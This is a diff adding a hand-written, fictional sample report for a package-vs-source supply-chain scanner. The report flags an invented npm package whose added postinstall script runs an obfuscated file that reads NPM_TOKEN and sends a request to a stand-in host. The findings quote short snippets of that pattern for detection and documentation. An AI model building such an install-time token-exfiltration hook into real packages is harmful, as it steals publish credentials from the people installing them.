@@ -1,0 +1,161 @@
+{
+  "$comment": "Hand-written illustrative sample of the PackageLens report contract (docs/report-schema.md). It was NOT produced by PackageLens, and the package, repository, hashes and model outputs are fictional.",
+  "schemaVersion": "0.1.0",
+  "tool": { "name": "packagelens", "version": "0.1.0" },
+  "generatedAt": "2026-11-01T00:00:00.000Z",
+  "input": { "ecosystem": "npm", "name": "example-pkg", "version": "1.2.0", "source": "registry" },
+  "package": {
+    "name": "example-pkg",
+    "version": "1.2.0",
+    "tarballUrl": "https://registry.npmjs.org/example-pkg/-/example-pkg-1.2.0.tgz",
+    "integrity": {
+      "expected": "sha512-EXAMPLEEXAMPLEEXAMPLEEXAMPLEEXAMPLEEXAMPLEEXAMPLEEXAMPLEEXAMPLEEXAMPLEEXAMPLEEXA==",
+      "actual": "sha512-EXAMPLEEXAMPLEEXAMPLEEXAMPLEEXAMPLEEXAMPLEEXAMPLEEXAMPLEEXAMPLEEXAMPLEEXAMPLEEXA==",
+      "verified": true
+    },
+    "provenance": {
+      "attestationPresent": false,
+      "claimedRepository": null,
+      "claimedCommit": null
+    },
+    "fileCount": 5,
+    "totalBytes": 48213
+  },
+  "source": {
+    "resolved": true,
+    "repository": "https://github.com/example-org/example-pkg",
+    "directory": null,
+    "ref": { "type": "gitHead", "value": "0123456789abcdef0123456789abcdef01234567", "commit": "0123456789abcdef0123456789abcdef01234567" },
+    "confidence": "exact-commit",
+    "notes": ["Source package.json name and version match the published package."]
+  },
+  "summary": {
+    "verdict": "suspicious",
+    "riskScore": 82,
+    "counts": { "identical": 1, "modified": 1, "packageOnly": 3, "sourceOnly": 1 },
+    "findingsBySeverity": { "info": 0, "low": 0, "medium": 1, "high": 2, "critical": 0 }
+  },
+  "files": [
+    {
+      "id": "f1",
+      "path": "README.md",
+      "status": "identical",
+      "package": { "sha256": "1111111111111111111111111111111111111111111111111111111111111111", "size": 2048 },
+      "source": { "sha256": "1111111111111111111111111111111111111111111111111111111111111111", "size": 2048 },
+      "explanation": { "category": "identical", "confidence": "high", "evidence": ["SHA-256 hashes match."] },
+      "findingIds": []
+    },
+    {
+      "id": "f2",
+      "path": "package.json",
+      "status": "modified",
+      "package": { "sha256": "2222222222222222222222222222222222222222222222222222222222222222", "size": 1310 },
+      "source": { "sha256": "3333333333333333333333333333333333333333333333333333333333333333", "size": 1190 },
+      "explanation": { "category": "unexplained", "confidence": "high", "evidence": ["scripts.postinstall exists in the package but not in the source package.json."] },
+      "findingIds": ["F1"]
+    },
+    {
+      "id": "f3",
+      "path": "dist/index.js",
+      "status": "package-only",
+      "package": { "sha256": "4444444444444444444444444444444444444444444444444444444444444444", "size": 15872 },
+      "source": null,
+      "explanation": {
+        "category": "generated-artifact",
+        "confidence": "high",
+        "evidence": [
+          "package.json main points to dist/index.js.",
+          "dist/index.js.map lists src/index.ts, and its sourcesContent matches the repository file."
+        ]
+      },
+      "findingIds": []
+    },
+    {
+      "id": "f4",
+      "path": "dist/index.js.map",
+      "status": "package-only",
+      "package": { "sha256": "5555555555555555555555555555555555555555555555555555555555555555", "size": 21504 },
+      "source": null,
+      "explanation": { "category": "generated-artifact", "confidence": "high", "evidence": ["Source map whose sources resolve to repository files."] },
+      "findingIds": []
+    },
+    {
+      "id": "f5",
+      "path": "lib/telemetry.min.js",
+      "status": "package-only",
+      "package": { "sha256": "6666666666666666666666666666666666666666666666666666666666666666", "size": 7479 },
+      "source": null,
+      "explanation": { "category": "unexplained", "confidence": "high", "evidence": ["No repository file, build configuration or source map accounts for this file."] },
+      "findingIds": ["F2", "F3"]
+    },
+    {
+      "id": "f6",
+      "path": "src/index.ts",
+      "status": "source-only",
+      "package": null,
+      "source": { "sha256": "7777777777777777777777777777777777777777777777777777777777777777", "size": 9120 },
+      "explanation": { "category": "not-published", "confidence": "high", "evidence": ["package.json files field includes only dist/ and lib/."] },
+      "findingIds": []
+    }
+  ],
+  "findings": [
+    {
+      "id": "F1",
+      "ruleId": "lifecycle-script-added",
+      "severity": "high",
+      "confidence": "high",
+      "title": "Install-time script added in the published package",
+      "description": "The published package.json defines a postinstall script that the source package.json does not.",
+      "fileId": "f2",
+      "introducedInPackage": true,
+      "evidence": [{ "path": "package.json", "line": 9, "snippet": "\"postinstall\": \"node lib/telemetry.min.js\"" }]
+    },
+    {
+      "id": "F2",
+      "ruleId": "credential-network-combination",
+      "severity": "high",
+      "confidence": "medium",
+      "title": "Reads sensitive environment variables and makes an outbound request",
+      "description": "The same file reads NPM_TOKEN and sends an HTTPS request to a hard-coded host. This is an attempt to transmit data, not proof of successful exfiltration.",
+      "fileId": "f5",
+      "introducedInPackage": true,
+      "evidence": [
+        { "path": "lib/telemetry.min.js", "line": 1, "snippet": "process.env.NPM_TOKEN" },
+        { "path": "lib/telemetry.min.js", "line": 1, "snippet": "https.request({hostname:\"collector.example.invalid\"" }
+      ]
+    },
+    {
+      "id": "F3",
+      "ruleId": "obfuscated-code",
+      "severity": "medium",
+      "confidence": "medium",
+      "title": "Obfuscated identifiers and encoded strings",
+      "description": "Many _0x-prefixed identifiers and a long hex-encoded string literal.",
+      "fileId": "f5",
+      "introducedInPackage": true,
+      "evidence": [{ "path": "lib/telemetry.min.js", "line": 1, "snippet": "var _0x3f1a=['\\x68\\x74\\x74\\x70\\x73'" }]
+    }
+  ],
+  "ai": {
+    "status": "completed",
+    "runs": [
+      { "stage": "classification", "model": "gemma4:e4b", "digest": "example-digest", "durationMs": 14200, "status": "completed" },
+      { "stage": "investigation", "model": "deepseek-r1:8b", "digest": "example-digest", "durationMs": 61800, "status": "completed" }
+    ],
+    "classifications": [
+      { "fileId": "f2", "label": "needs-investigation", "rationale": "A new install script runs code at install time." },
+      { "fileId": "f3", "label": "expected-artifact", "rationale": "Compiled output of src/index.ts." },
+      { "fileId": "f4", "label": "expected-artifact", "rationale": "Source map for dist/index.js." },
+      { "fileId": "f5", "label": "suspicious", "rationale": "Minified file with no source counterpart that is executed by the new postinstall script." }
+    ],
+    "investigations": [
+      {
+        "findingId": "F2",
+        "explanation": "On install, the postinstall script runs lib/telemetry.min.js, which reads NPM_TOKEN and sends it to an external host.",
+        "implications": "If the request succeeds, the installing user's npm publish token could be exposed.",
+        "uncertainty": "Static analysis cannot confirm the remote host is reachable or that data was received."
+      }
+    ]
+  },
+  "errors": []
+}
